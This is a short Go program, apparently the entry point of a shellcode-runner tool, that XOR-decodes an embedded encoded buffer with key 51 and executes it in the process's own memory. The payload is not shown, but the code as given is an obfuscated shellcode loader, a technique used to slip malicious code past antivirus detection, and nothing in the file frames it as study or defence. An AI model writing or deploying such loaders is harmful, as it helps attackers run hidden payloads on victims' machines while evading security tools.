package main

import (
	"fmt"
	"github.com/rurreac/go-shellcode/shellcode"
	"github.com/rurreac/go-shellcode/utils"
)

func main() {
	if err := shellcode.LocalExecute(utils.Xor(utils.EncBuf, 51)); err != nil {
		fmt.Println(err)
	}
}
